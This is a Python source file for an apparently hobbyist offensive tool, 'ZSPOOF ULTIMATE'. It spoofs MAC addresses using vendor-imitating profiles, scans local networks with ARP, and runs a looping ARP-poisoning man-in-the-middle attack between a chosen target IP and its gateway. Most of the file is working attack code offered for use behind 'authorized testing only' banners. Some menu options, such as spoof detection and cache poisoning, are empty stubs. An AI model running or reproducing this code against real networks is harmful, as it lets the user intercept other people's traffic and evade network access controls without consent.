#!/usr/bin/env python3
"""
ZSPOOF ULTIMATE - Advanced Network Identity Manipulation Framework
Author: Ziad SAGHIR (Zeus)
Version: 2.0.0

Educational tool for network security testing and red team operations.
"""

import subprocess
import sys
import os
import time
import platform
import json
import hashlib
import socket
import struct
from datetime import datetime
from pathlib import Path
from typing import Optional, Dict, List, Tuple
from dataclasses import dataclass
from enum import Enum

try:
    from scapy.all import ARP, Ether, sendp, srp, conf, get_if_list, get_if_hwaddr
    from scapy.all import IP, TCP, UDP, ICMP
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False

try:
    from tqdm import tqdm
    TQDM_AVAILABLE = True
except ImportError:
    TQDM_AVAILABLE = False

# ============================================================================
# CONFIGURATION & CONSTANTS
# ============================================================================

BASE_DIR = Path(__file__).parent.absolute()
BIN_DIR = BASE_DIR.parent / "bin"
LOGS_DIR = BASE_DIR.parent / "logs"
PROFILES_DIR = BASE_DIR.parent / "profiles"

# Ensure directories exist
for directory in [BIN_DIR, LOGS_DIR, PROFILES_DIR]:
    directory.mkdir(exist_ok=True)

class Platform(Enum):
    LINUX = "linux"
    WINDOWS = "windows"
    MACOS = "darwin"
    UNKNOWN = "unknown"

CURRENT_PLATFORM = Platform(platform.system().lower()) if platform.system().lower() in [p.value for p in Platform] else Platform.UNKNOWN

# ============================================================================
# STYLING & UI
# ============================================================================

class Colors:
    """ANSI color codes for terminal output"""
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    
    @staticmethod
    def disable():
        """Disable colors (for Windows compatibility)"""
        Colors.HEADER = ''
        Colors.BLUE = ''
        Colors.CYAN = ''
        Colors.GREEN = ''
        Colors.WARNING = ''
        Colors.FAIL = ''
        Colors.ENDC = ''
        Colors.BOLD = ''
        Colors.UNDERLINE = ''

# Disable colors on Windows unless in modern terminal
if CURRENT_PLATFORM == Platform.WINDOWS and not os.environ.get('WT_SESSION'):
    Colors.disable()

def print_banner():
    """Display ASCII art banner"""
    banner = f"""{Colors.HEADER}
╔═══════════════════════════════════════════════════════════════════╗
║                                                                   ║
║  ███████╗███████╗██████╗  ██████╗  ██████╗ ███████╗              ║
║  ╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔═══██╗██╔════╝              ║
║    ███╔╝ ███████╗██████╔╝██║   ██║██║   ██║█████╗                ║
║   ███╔╝  ╚════██║██╔═══╝ ██║   ██║██║   ██║██╔══╝                ║
║  ███████╗███████║██║     ╚██████╔╝╚██████╔╝██║                   ║
║  ╚══════╝╚══════╝╚═╝      ╚═════╝  ╚═════╝ ╚═╝                   ║
║                                                                   ║
║              "Identity is a Surface - Trust is an Illusion"      ║
║                                                                   ║
╚═══════════════════════════════════════════════════════════════════╝

{Colors.CYAN}    Author:      {Colors.ENDC}Ziad SAGHIR (Zeus)
{Colors.CYAN}    Discipline:  {Colors.ENDC}Offensive Security / Network Research  
{Colors.CYAN}    Version:     {Colors.ENDC}2.0.0 ULTIMATE EDITION
{Colors.CYAN}    Platform:    {Colors.ENDC}{CURRENT_PLATFORM.value.upper()}
{Colors.CYAN}    Scope:       {Colors.ENDC}Authorized Testing Only
    
{Colors.WARNING}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{Colors.ENDC}
"""
    print(banner)

def progress_bar(description: str, duration: float = 1.0):
    """Display progress bar with fallback"""
    if TQDM_AVAILABLE:
        for _ in tqdm(range(100), desc=description, ncols=70, 
                      bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt}"):
            time.sleep(duration / 100)
    else:
        print(f"[*] {description}...", end='', flush=True)
        time.sleep(duration)
        print(f" {Colors.GREEN}✓{Colors.ENDC}")

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class NetworkInterface:
    """Represents a network interface"""
    name: str
    mac: str
    state: str
    ip: Optional[str] = None
    gateway: Optional[str] = None

@dataclass
class SpoofSession:
    """Stores spoofing session data"""
    interface: str
    original_mac: str
    spoofed_mac: str
    profile: str
    timestamp: datetime
    arp_targets: List[str] = None
    
    def to_dict(self) -> dict:
        return {
            'interface': self.interface,
            'original_mac': self.original_mac,
            'spoofed_mac': self.spoofed_mac,
            'profile': self.profile,
            'timestamp': self.timestamp.isoformat(),
            'arp_targets': self.arp_targets or []
        }

# ============================================================================
# CORE FUNCTIONALITY
# ============================================================================

class PlatformAdapter:
    """Cross-platform system call adapter"""
    
    @staticmethod
    def is_admin() -> bool:
        """Check if running with admin/root privileges"""
        if CURRENT_PLATFORM == Platform.WINDOWS:
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            except:
                return False
        else:
            return os.geteuid() == 0
    
    @staticmethod
    def get_interfaces() -> List[NetworkInterface]:
        """Get list of network interfaces"""
        interfaces = []
        
        if CURRENT_PLATFORM == Platform.LINUX:
            try:
                # Use ip command
                result = subprocess.check_output(['ip', 'link', 'show'], text=True)
                lines = result.split('\n')
                
                current_iface = None
                for line in lines:
                    if ': ' in line and not line.startswith(' '):
                        parts = line.split(': ')
                        if len(parts) >= 2:
                            current_iface = parts[1].split('@')[0]
                    elif 'link/ether' in line and current_iface:
                        mac = line.split()[1]
                        state = 'up' if 'UP' in line else 'down'
                        interfaces.append(NetworkInterface(current_iface, mac, state))
                        current_iface = None
            except:
                pass
        
        elif CURRENT_PLATFORM == Platform.WINDOWS:
            try:
                import wmi
                w = wmi.WMI()
                for iface in w.Win32_NetworkAdapter():
                    if iface.MACAddress and iface.NetEnabled:
                        interfaces.append(NetworkInterface(
                            name=iface.Name,
                            mac=iface.MACAddress.replace('-', ':'),
                            state='up' if iface.NetEnabled else 'down'
                        ))
            except:
                # Fallback to getmac
                try:
                    result = subprocess.check_output(['getmac', '/v', '/fo', 'csv'], text=True)
                    lines = result.strip().split('\n')[1:]  # Skip header
                    for line in lines:
                        parts = line.strip('"').split('","')
                        if len(parts) >= 3 and parts[2] != 'N/A':
                            interfaces.append(NetworkInterface(
                                name=parts[0],
                                mac=parts[2].replace('-', ':'),
                                state='up'
                            ))
                except:
                    pass
        
        # Use scapy as fallback
        if not interfaces and SCAPY_AVAILABLE:
            for iface in get_if_list():
                try:
                    mac = get_if_hwaddr(iface)
                    if mac and mac != '00:00:00:00:00:00':
                        interfaces.append(NetworkInterface(iface, mac, 'unknown'))
                except:
                    pass
        
        return interfaces
    
    @staticmethod
    def set_mac_address(interface: str, new_mac: str) -> bool:
        """Set MAC address (platform-specific)"""
        try:
            if CURRENT_PLATFORM == Platform.LINUX:
                # Bring interface down
                subprocess.run(['ip', 'link', 'set', 'dev', interface, 'down'], 
                             check=True, capture_output=True)
                # Change MAC
                subprocess.run(['ip', 'link', 'set', 'dev', interface, 'address', new_mac],
                             check=True, capture_output=True)
                # Bring interface up
                subprocess.run(['ip', 'link', 'set', 'dev', interface, 'up'],
                             check=True, capture_output=True)
                return True
            
            elif CURRENT_PLATFORM == Platform.WINDOWS:
                # Windows requires registry modification or driver-specific tools
                # Using macchanger.exe if available, otherwise notify user
                print(f"{Colors.WARNING}[!] Windows MAC changing requires:")
                print(f"    1. Administrator privileges")
                print(f"    2. Third-party tool (macchanger, tmac, etc.)")
                print(f"    3. Or manual registry editing{Colors.ENDC}")
                print(f"\n{Colors.CYAN}[i] Attempting registry method...{Colors.ENDC}")
                
                # This is a simplified version - full implementation would need
                # to modify registry at HKLM\SYSTEM\CurrentControlSet\Control\Class\{4d36e972-e325-11ce-bfc1-08002be10318}
                # and restart the adapter
                print(f"{Colors.FAIL}[!] Windows MAC changing not fully automated.")
                print(f"    Use Device Manager → Network Adapter → Advanced → Network Address{Colors.ENDC}")
                return False
            
            elif CURRENT_PLATFORM == Platform.MACOS:
                # macOS method
                subprocess.run(['sudo', 'ifconfig', interface, 'ether', new_mac],
                             check=True, capture_output=True)
                return True
            
        except subprocess.CalledProcessError as e:
            print(f"{Colors.FAIL}[!] Failed to change MAC: {e}{Colors.ENDC}")
            return False
        
        return False
    
    @staticmethod
    def get_default_gateway(interface: str) -> Optional[str]:
        """Get default gateway for interface"""
        try:
            if CURRENT_PLATFORM == Platform.LINUX:
                result = subprocess.check_output(['ip', 'route', 'show', 'default'], text=True)
                for line in result.split('\n'):
                    if interface in line:
                        parts = line.split()
                        if 'via' in parts:
                            return parts[parts.index('via') + 1]
            elif CURRENT_PLATFORM == Platform.WINDOWS:
                result = subprocess.check_output(['route', 'print', '0.0.0.0'], text=True)
                # Parse Windows route table
                for line in result.split('\n'):
                    if '0.0.0.0' in line and interface.lower() in line.lower():
                        parts = line.split()
                        if len(parts) >= 3:
                            return parts[2]
        except:
            pass
        return None

class MACEngine:
    """Interface to C++ MAC generation engine"""
    
    def __init__(self):
        self.binary_path = BIN_DIR / "core_engine"
        if CURRENT_PLATFORM == Platform.WINDOWS:
            self.binary_path = BIN_DIR / "core_engine.exe"
    
    def generate(self, profile: str = "random") -> str:
        """Generate MAC address using C++ engine"""
        if not self.binary_path.exists():
            raise RuntimeError(f"Engine binary not found at {self.binary_path}. Run 'make' first.")
        
        try:
            result = subprocess.run(
                [str(self.binary_path), profile],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout.strip()
        except subprocess.TimeoutExpired:
            raise RuntimeError("Engine timeout")
        except Exception as e:
            raise RuntimeError(f"Engine error: {e}")
    
    def validate(self, mac: str) -> bool:
        """Validate MAC address format"""
        try:
            result = subprocess.run(
                [str(self.binary_path), "validate", mac],
                capture_output=True,
                text=True,
                timeout=5
            )
            return result.stdout.strip() == "VALID"
        except:
            return False

class ARPSpoofer:
    """ARP spoofing/poisoning functionality"""
    
    def __init__(self, interface: str):
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for ARP spoofing. Install with: pip install scapy")
        
        self.interface = interface
        self.running = False
        conf.iface = interface
        conf.verb = 0  # Suppress scapy output
    
    def scan_network(self, ip_range: str = None) -> List[Dict[str, str]]:
        """Scan network for active hosts"""
        if not ip_range:
            # Auto-detect network range
            ip_range = "192.168.1.0/24"  # Default
        
        print(f"{Colors.BLUE}[*] Scanning network {ip_range}...{Colors.ENDC}")
        
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        
        result = srp(packet, timeout=3, verbose=0)[0]
        
        devices = []
        for sent, received in result:
            devices.append({
                'ip': received.psrc,
                'mac': received.hwsrc
            })
        
        return devices
    
    def spoof(self, target_ip: str, gateway_ip: str, restore: bool = False):
        """Send spoofed ARP packets"""
        if restore:
            # Get real MAC addresses to restore
            target_mac = self._get_mac(target_ip)
            gateway_mac = self._get_mac(gateway_ip)
            
            # Send restore packets
            send_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
            sendp(Ether(dst=target_mac)/send_packet, verbose=0, count=5)
        else:
            # Send spoofed packets
            send_packet = ARP(op=2, pdst=target_ip, psrc=gateway_ip)
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/send_packet, verbose=0)
    
    def _get_mac(self, ip: str) -> str:
        """Get MAC address for IP"""
        arp = ARP(pdst=ip)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether/arp
        
        result = srp(packet, timeout=3, verbose=0)[0]
        if result:
            return result[0][1].hwsrc
        return None
    
    def mitm_attack(self, target_ip: str, gateway_ip: str, duration: int = 60):
        """Perform Man-in-the-Middle attack"""
        print(f"{Colors.WARNING}[!] Starting MITM attack...")
        print(f"    Target: {target_ip}")
        print(f"    Gateway: {gateway_ip}")
        print(f"    Duration: {duration}s{Colors.ENDC}")
        
        self.running = True
        start_time = time.time()
        
        try:
            while self.running and (time.time() - start_time) < duration:
                self.spoof(target_ip, gateway_ip)
                self.spoof(gateway_ip, target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            print(f"\n{Colors.WARNING}[!] Stopping MITM attack...{Colors.ENDC}")
        finally:
            # Restore ARP tables
            print(f"{Colors.BLUE}[*] Restoring ARP tables...{Colors.ENDC}")
            self.spoof(target_ip, gateway_ip, restore=True)
            self.spoof(gateway_ip, target_ip, restore=True)
            self.running = False

class SessionManager:
    """Manage spoofing sessions"""
    
    def __init__(self):
        self.sessions_file = LOGS_DIR / "sessions.json"
        self.current_session: Optional[SpoofSession] = None
    
    def start_session(self, session: SpoofSession):
        """Start new session"""
        self.current_session = session
        self._save_session()
    
    def end_session(self):
        """End current session"""
        if self.current_session:
            self._save_session()
            self.current_session = None
    
    def _save_session(self):
        """Save session to log file"""
        sessions = self._load_sessions()
        sessions.append(self.current_session.to_dict())
        
        with open(self.sessions_file, 'w') as f:
            json.dump(sessions, f, indent=2)
    
    def _load_sessions(self) -> List[dict]:
        """Load previous sessions"""
        if self.sessions_file.exists():
            with open(self.sessions_file, 'r') as f:
                return json.load(f)
        return []
    
    def get_history(self, limit: int = 10) -> List[dict]:
        """Get session history"""
        sessions = self._load_sessions()
        return sessions[-limit:]

# ============================================================================
# MAIN APPLICATION
# ============================================================================

class ZSpoofUltimate:
    """Main application class"""
    
    def __init__(self):
        self.engine = MACEngine()
        self.session_mgr = SessionManager()
        self.adapter = PlatformAdapter()
        
    def run(self):
        """Main entry point"""
        print_banner()
        
        # Check privileges
        if not self.adapter.is_admin():
            print(f"{Colors.FAIL}[!] Administrator/Root privileges required!{Colors.ENDC}")
            if CURRENT_PLATFORM == Platform.WINDOWS:
                print(f"{Colors.CYAN}[i] Right-click and 'Run as Administrator'{Colors.ENDC}")
            else:
                print(f"{Colors.CYAN}[i] Run with 'sudo python3 {sys.argv[0]}'{Colors.ENDC}")
            sys.exit(1)
        
        # Get interfaces
        interfaces = self.adapter.get_interfaces()
        if not interfaces:
            print(f"{Colors.FAIL}[!] No network interfaces found!{Colors.ENDC}")
            sys.exit(1)
        
        # Select interface
        interface = self._select_interface(interfaces)
        if not interface:
            sys.exit(0)
        
        # Main menu
        while True:
            choice = self._show_main_menu()
            
            if choice == '1':
                self._mac_spoofing_menu(interface)
            elif choice == '2':
                if SCAPY_AVAILABLE:
                    self._arp_spoofing_menu(interface)
                else:
                    print(f"{Colors.FAIL}[!] ARP spoofing requires Scapy.")
                    print(f"    Install with: pip install scapy{Colors.ENDC}")
            elif choice == '3':
                self._network_analysis_menu(interface)
            elif choice == '4':
                self._show_history()
            elif choice == '0':
                print(f"\n{Colors.GREEN}[+] Stay ethical. Stay curious.{Colors.ENDC}")
                sys.exit(0)
    
    def _select_interface(self, interfaces: List[NetworkInterface]) -> Optional[NetworkInterface]:
        """Interface selection menu"""
        print(f"\n{Colors.HEADER}═══ Available Network Interfaces ═══{Colors.ENDC}\n")
        
        for idx, iface in enumerate(interfaces, 1):
            status = f"{Colors.GREEN}UP{Colors.ENDC}" if iface.state == 'up' else f"{Colors.FAIL}DOWN{Colors.ENDC}"
            print(f"{idx}. {Colors.BOLD}{iface.name}{Colors.ENDC}")
            print(f"   MAC: {iface.mac} | Status: {status}")
        
        print(f"\n0. Exit")
        
        try:
            choice = int(input(f"\n{Colors.CYAN}Select interface > {Colors.ENDC}"))
            if choice == 0:
                return None
            if 1 <= choice <= len(interfaces):
                return interfaces[choice - 1]
        except (ValueError, IndexError):
            pass
        
        print(f"{Colors.FAIL}[!] Invalid selection{Colors.ENDC}")
        return None
    
    def _show_main_menu(self) -> str:
        """Display main menu"""
        print(f"\n{Colors.HEADER}═══ MAIN MENU ═══{Colors.ENDC}\n")
        print(f"1. {Colors.BOLD}MAC Address Spoofing{Colors.ENDC}")
        print(f"2. {Colors.BOLD}ARP Spoofing / MITM{Colors.ENDC}")
        print(f"3. {Colors.BOLD}Network Analysis{Colors.ENDC}")
        print(f"4. {Colors.BOLD}Session History{Colors.ENDC}")
        print(f"\n0. Exit")
        
        return input(f"\n{Colors.GREEN}Choose option > {Colors.ENDC}").strip()
    
    def _mac_spoofing_menu(self, interface: NetworkInterface):
        """MAC spoofing submenu"""
        print(f"\n{Colors.HEADER}═══ MAC SPOOFING PROFILES ═══{Colors.ENDC}\n")
        print("1. Corporate Environment (Dell/Lenovo/HP/Cisco)")
        print("2. Public WiFi (Apple/Samsung/Google)")
        print("3. Smart Home / IoT (ESP32/Amazon/Tuya)")
        print("4. Gaming LAN (PlayStation/Xbox/Nintendo)")
        print("5. Stealth Mode (Ultra-realistic mix)")
        print("6. Pure Random (Cryptographic)")
        print("7. Custom MAC Address")
        print("\n0. Back")
        
        choice = input(f"\n{Colors.GREEN}Select profile > {Colors.ENDC}").strip()
        
        profile_map = {
            '1': 'corporate',
            '2': 'cafe',
            '3': 'iot',
            '4': 'gamer',
            '5': 'stealth',
            '6': 'random'
        }
        
        if choice == '0':
            return
        elif choice == '7':
            custom_mac = input(f"{Colors.CYAN}Enter MAC address (XX:XX:XX:XX:XX:XX) > {Colors.ENDC}").strip()
            if self.engine.validate(custom_mac):
                self._apply_mac(interface, custom_mac, "custom")
            else:
                print(f"{Colors.FAIL}[!] Invalid MAC address format{Colors.ENDC}")
        elif choice in profile_map:
            profile = profile_map[choice]
            print(f"\n{Colors.BLUE}[*] Generating {profile.upper()} profile...{Colors.ENDC}")
            new_mac = self.engine.generate(profile)
            self._apply_mac(interface, new_mac, profile)
    
    def _apply_mac(self, interface: NetworkInterface, new_mac: str, profile: str):
        """Apply MAC address change"""
        print(f"\n{Colors.BOLD}Target Interface:{Colors.ENDC} {interface.name}")
        print(f"{Colors.BOLD}Original MAC:    {Colors.ENDC} {interface.mac}")
        print(f"{Colors.BOLD}New MAC:         {Colors.ENDC} {new_mac}")
        print(f"{Colors.BOLD}Profile:         {Colors.ENDC} {profile.upper()}")
        
        confirm = input(f"\n{Colors.WARNING}Apply changes? (yes/no) > {Colors.ENDC}").strip().lower()
        if confirm != 'yes':
            print(f"{Colors.CYAN}[i] Operation cancelled{Colors.ENDC}")
            return
        
        progress_bar("Rewriting network identity", 1.5)
        
        if self.adapter.set_mac_address(interface.name, new_mac):
            print(f"\n{Colors.GREEN}[+] MAC ADDRESS SPOOFED SUCCESSFULLY!{Colors.ENDC}")
            print(f"    {Colors.BOLD}{new_mac}{Colors.ENDC}")
            
            # Save session
            session = SpoofSession(
                interface=interface.name,
                original_mac=interface.mac,
                spoofed_mac=new_mac,
                profile=profile,
                timestamp=datetime.now()
            )
            self.session_mgr.start_session(session)
            
            print(f"\n{Colors.WARNING}[!] To restore: Reboot or run this tool again{Colors.ENDC}")
        else:
            print(f"\n{Colors.FAIL}[!] Failed to apply MAC address{Colors.ENDC}")
    
    def _arp_spoofing_menu(self, interface: NetworkInterface):
        """ARP spoofing submenu"""
        print(f"\n{Colors.HEADER}═══ ARP SPOOFING OPERATIONS ═══{Colors.ENDC}\n")
        print(f"{Colors.WARNING}WARNING: ARP spoofing can disrupt network traffic!{Colors.ENDC}")
        print(f"{Colors.WARNING}Only use in authorized testing environments!{Colors.ENDC}\n")
        
        print("1. Scan Network (Discover hosts)")
        print("2. MITM Attack (Man-in-the-Middle)")
        print("3. ARP Cache Poisoning")
        print("\n0. Back")
        
        choice = input(f"\n{Colors.GREEN}Select operation > {Colors.ENDC}").strip()
        
        if choice == '0':
            return
        
        spoofer = ARPSpoofer(interface.name)
        
        if choice == '1':
            ip_range = input(f"{Colors.CYAN}IP range (default: 192.168.1.0/24) > {Colors.ENDC}").strip()
            if not ip_range:
                ip_range = "192.168.1.0/24"
            
            devices = spoofer.scan_network(ip_range)
            print(f"\n{Colors.GREEN}[+] Found {len(devices)} devices:{Colors.ENDC}\n")
            for dev in devices:
                print(f"  {dev['ip']:15s} - {dev['mac']}")
        
        elif choice == '2':
            target_ip = input(f"{Colors.CYAN}Target IP > {Colors.ENDC}").strip()
            gateway_ip = input(f"{Colors.CYAN}Gateway IP (default: auto-detect) > {Colors.ENDC}").strip()
            
            if not gateway_ip:
                gateway_ip = self.adapter.get_default_gateway(interface.name)
                print(f"[i] Using gateway: {gateway_ip}")
            
            duration = input(f"{Colors.CYAN}Duration in seconds (default: 60) > {Colors.ENDC}").strip()
            duration = int(duration) if duration.isdigit() else 60
            
            spoofer.mitm_attack(target_ip, gateway_ip, duration)
    
    def _network_analysis_menu(self, interface: NetworkInterface):
        """Network analysis submenu"""
        print(f"\n{Colors.HEADER}═══ NETWORK ANALYSIS ═══{Colors.ENDC}\n")
        print("1. Show Interface Details")
        print("2. Detect MAC Spoofing (Analyze traffic)")
        print("3. Export Session Logs")
        print("\n0. Back")
        
        choice = input(f"\n{Colors.GREEN}Select option > {Colors.ENDC}").strip()
        
        if choice == '1':
            self._show_interface_details(interface)
        elif choice == '3':
            self._export_logs()
    
    def _show_interface_details(self, interface: NetworkInterface):
        """Display detailed interface information"""
        print(f"\n{Colors.BOLD}Interface Details:{Colors.ENDC}")
        print(f"  Name:    {interface.name}")
        print(f"  MAC:     {interface.mac}")
        print(f"  State:   {interface.state}")
        print(f"  IP:      {interface.ip or 'N/A'}")
        
        gateway = self.adapter.get_default_gateway(interface.name)
        if gateway:
            print(f"  Gateway: {gateway}")
    
    def _show_history(self):
        """Display session history"""
        history = self.session_mgr.get_history()
        
        if not history:
            print(f"\n{Colors.CYAN}[i] No previous sessions{Colors.ENDC}")
            return
        
        print(f"\n{Colors.HEADER}═══ SESSION HISTORY ═══{Colors.ENDC}\n")
        for idx, session in enumerate(history, 1):
            print(f"{idx}. {session['timestamp']}")
            print(f"   Interface: {session['interface']}")
            print(f"   {session['original_mac']} → {session['spoofed_mac']}")
            print(f"   Profile: {session['profile']}")
            print()
    
    def _export_logs(self):
        """Export session logs"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        export_file = LOGS_DIR / f"zspoof_export_{timestamp}.json"
        
        sessions = self.session_mgr._load_sessions()
        with open(export_file, 'w') as f:
            json.dump(sessions, f, indent=2)
        
        print(f"\n{Colors.GREEN}[+] Logs exported to: {export_file}{Colors.ENDC}")

# ============================================================================
# ENTRY POINT
# ============================================================================

def main():
    """Application entry point"""
    try:
        app = ZSpoofUltimate()
        app.run()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.CYAN}[i] Operation cancelled by user{Colors.ENDC}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Fatal error: {e}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()
